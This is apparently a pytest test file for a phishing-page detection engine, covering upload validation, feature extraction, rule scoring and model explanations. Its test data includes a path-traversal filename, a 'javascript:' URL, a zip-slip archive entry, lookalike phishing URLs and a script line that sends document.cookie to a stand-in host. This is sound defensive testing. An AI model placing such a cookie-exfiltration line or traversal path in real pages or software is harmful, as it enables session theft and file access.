"""Unit tests for the security engine (no web server involved)."""
from __future__ import annotations

import io
import zipfile

import pytest

from engine.features import NUMERIC_FEATURES, extract, registrable_domain
from engine.pipeline import analyze
from engine.rules import evaluate
from engine.validation import InputError, read_dataset_zip, safe_filename, validate_page, validate_url

from .conftest import fixture_bytes

CFG = {"phishing_threshold": 0.7, "suspicious_threshold": 0.4, "ml_weight": 0.6, "disabled_rules": []}


# ---------------------------------------------------------------- validation
def test_rejects_wrong_extension():
    with pytest.raises(InputError) as e:
        validate_page("evil.exe", b"<html></html>", 1000)
    assert e.value.code == "UNSUPPORTED_TYPE"


def test_rejects_oversized_page():
    with pytest.raises(InputError) as e:
        validate_page("big.html", b"<html>" + b"a" * 5000, 1000)
    assert e.value.code == "FILE_TOO_LARGE"


def test_rejects_binary_and_non_html():
    with pytest.raises(InputError):
        validate_page("x.html", b"\x00\x01\x02<html>", 1000)
    with pytest.raises(InputError):
        validate_page("x.html", b"just some text, no markup", 1000)


def test_rejects_empty_file():
    with pytest.raises(InputError):
        validate_page("x.html", b"", 1000)


@pytest.mark.parametrize("name,expected", [("../../etc/passwd.html", "passwd.html"),
                                           ("C:\\temp\\a b.html", "a_b.html"), ("", "page.html")])
def test_safe_filename_strips_paths(name, expected):
    assert safe_filename(name) == expected


@pytest.mark.parametrize("url", ["javascript:alert(1)", "ftp://x.test/", "http://", "http://a.test/\x00", "h" * 3000])
def test_rejects_bad_urls(url):
    with pytest.raises(InputError):
        validate_url(url)


def test_zip_slip_and_labels():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("../../outside.html", "<html><body>hi</body></html>")
        z.writestr("notes.txt", "ignored")
        z.writestr("labels.csv", "filename,label,source_url\noutside.html,benign,https://a.example.com/\n")
    items = read_dataset_zip(buf.getvalue(), 10_000, 10, 10_000)
    assert [i.filename for i in items] == ["outside.html"]  # path components dropped, txt skipped
    assert items[0].label == "benign"


def test_zip_bomb_declared_size_rejected():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("a.html", "<html>" + "A" * 200_000 + "</html>")  # compresses to a few hundred bytes
    with pytest.raises(InputError) as e:
        read_dataset_zip(buf.getvalue(), 50_000, 10, 300_000)
    assert e.value.code == "FILE_TOO_LARGE"


# ---------------------------------------------------------------- features
def test_registrable_domain():
    assert registrable_domain("login.paypal.com") == "paypal.com"
    assert registrable_domain("www.jazzcash.com.pk") == "jazzcash.com.pk"
    assert registrable_domain("185.22.91.7") == "185.22.91.7"


def test_all_features_present_and_numeric():
    fr = extract(fixture_bytes("benign_article.html").decode(), "https://news.example.com/a")
    assert set(NUMERIC_FEATURES) <= set(fr.values)
    assert all(isinstance(v, (int, float)) for v in fr.vector())


def test_external_password_form_detected():
    fr = extract(fixture_bytes("phish_brand_clone.html").decode(), "http://paypal-secure-verify.tk/webscr")
    assert fr.values["external_form_action"] == 1
    assert fr.values["brand_domain_mismatch"] == 1
    assert "collect7.kit.test" in fr.evidence["external_form_action"][0]


def test_legit_brand_on_own_domain_not_mismatch():
    fr = extract(fixture_bytes("benign_bank_login.html").decode(), "https://www.hbl.com/login")
    assert fr.values["brand_domain_mismatch"] == 0
    assert fr.values["external_form_action"] == 0


def test_malformed_html_does_not_crash():
    # Unclosed <title> swallows the rest of the page; we only require a clean, complete result.
    fr = extract(fixture_bytes("edge_malformed.html").decode(), None)
    assert len(fr.vector()) == len(NUMERIC_FEATURES)


def test_scripts_are_not_executed():
    # A page that would try to beacon out if executed: we only count it as a feature.
    html = "<html><body><script>fetch('https://x.test/steal?c='+document.cookie)</script></body></html>"
    fr = extract(html, "https://a.example.com/")
    assert fr.values["num_scripts"] == 1


# ---------------------------------------------------------------- rules + pipeline
def test_rules_fire_with_reasons_and_respect_disable():
    fr = extract(fixture_bytes("phish_ip_host.html").decode(), "http://185.22.91.7/office365/login.php")
    res = evaluate(fr)
    ids = {r["id"] for r in res["fired"]}
    assert "R01" in ids and all(r["reason"] for r in res["fired"])
    res2 = evaluate(fr, disabled=["R01"])
    assert "R01" not in {r["id"] for r in res2["fired"]} and res2["score"] < res["score"]


def test_benign_page_has_no_critical_warning():
    r = analyze(fixture_bytes("benign_article.html").decode(), "https://news.example.com/food/x", CFG, None)
    assert r["decision"] == "benign" and r["severity"] in {"none", "low"}


def test_rules_only_mode_when_no_model():
    r = analyze(fixture_bytes("phish_brand_clone.html").decode(), "http://paypal-secure-verify.tk/webscr/signin", CFG, None)
    assert r["mode"] == "rules_only" and r["ml"] is None
    assert r["decision"] == "phishing"
    assert r["versions"]["rules"] and r["thresholds"]["phishing"] == 0.7  # reproducibility data stored


def test_r04_no_longer_flags_articles_that_mention_brands():
    """Regression for the rules-1.0 false positive documented in docs/test-plan.md (T4)."""
    html = fixture_bytes("edge_brand_mention_article.html").decode()
    r = analyze(html, "https://security-blog.example.org/fake-payment-pages", CFG, None)
    assert r["decision"] == "benign" and "R04" not in {f["id"] for f in r["rules"]["fired"]}


def test_threshold_change_changes_decision():
    # Plain-HTTP bare login page: R11 (0.25) + R20 (0.20) -> noisy-OR 0.40 = exactly "suspicious".
    html = "<html><body><form action='/s'><input type='password' name='p'></form></body></html>"
    url = "http://intranet.example.com/login"
    assert analyze(html, url, CFG, None)["decision"] == "suspicious"
    assert analyze(html, url, {**CFG, "disabled_rules": ["R11"]}, None)["decision"] == "benign"
    assert analyze(html, url, {**CFG, "suspicious_threshold": 0.5}, None)["decision"] == "benign"


@pytest.mark.parametrize("url,feature", [
    ("http://paypa1-login.com/x", "lookalike_brand_host"),
    ("http://rnicrosoft-support.net/", "lookalike_brand_host"),
    ("http://paypal.com.account-check.info/login", "brand_in_subdomain"),
])
def test_lookalike_and_subdomain_brand(url, feature):
    fr = extract("<html><body>hi</body></html>", url)
    assert fr.values[feature] == 1


def test_real_brand_domains_not_lookalike():
    for url in ("https://www.paypal.com/signin", "https://login.microsoftonline.com/", "https://www.meezanbank.com/"):
        fr = extract("<html><body>hi</body></html>", url)
        assert fr.values["lookalike_brand_host"] == 0 and fr.values["brand_in_subdomain"] == 0, url


def test_form_to_ip_and_data_uri():
    html = ("<html><body><form action='http://45.9.1.2/p.php'><input type=password></form>"
            "<iframe src='data:text/html;base64,PGgxPmhpPC9oMT4='></iframe></body></html>")
    fr = extract(html, "https://a.example.com/")
    assert fr.values["form_action_ip"] == 1 and fr.values["data_uri_count"] == 1


def test_forest_explanations_are_exact():
    """bias + sum(contributions) must equal the forest's predicted probability (report §3.3)."""
    import numpy as np
    from engine.model import explain_contributions, make_pipeline
    rng = np.random.default_rng(0)
    X = rng.normal(size=(300, 6)) * [1, 10, 1, 1, 5, 1]
    y = (X[:, 0] + X[:, 1] / 10 > 0).astype(int)
    pipe = make_pipeline("random_forest").fit(X, y)
    forest = pipe.named_steps["clf"]
    bias = np.mean([e.tree_.value[0, 0, 1] / e.tree_.value[0, 0].sum() for e in forest.estimators_])
    for i in range(5):
        contrib, unit = explain_contributions(pipe, X[i:i + 1])
        assert unit == "probability"
        assert abs(bias + contrib.sum() - pipe.predict_proba(X[i:i + 1])[0, 1]) < 1e-9


def test_shipped_model_loads_and_explains():
    from pathlib import Path
    from engine.model import load
    root = Path(__file__).resolve().parent.parent
    model = load(root / "models" / "model.joblib")
    assert model is not None and model.meta["sha256"]
    fr = extract(fixture_bytes("phish_brand_clone.html").decode(), "http://paypal-secure-verify.tk/webscr/signin")
    out = model.predict(fr)
    assert 0 <= out["probability"] <= 1 and out["top_features"]
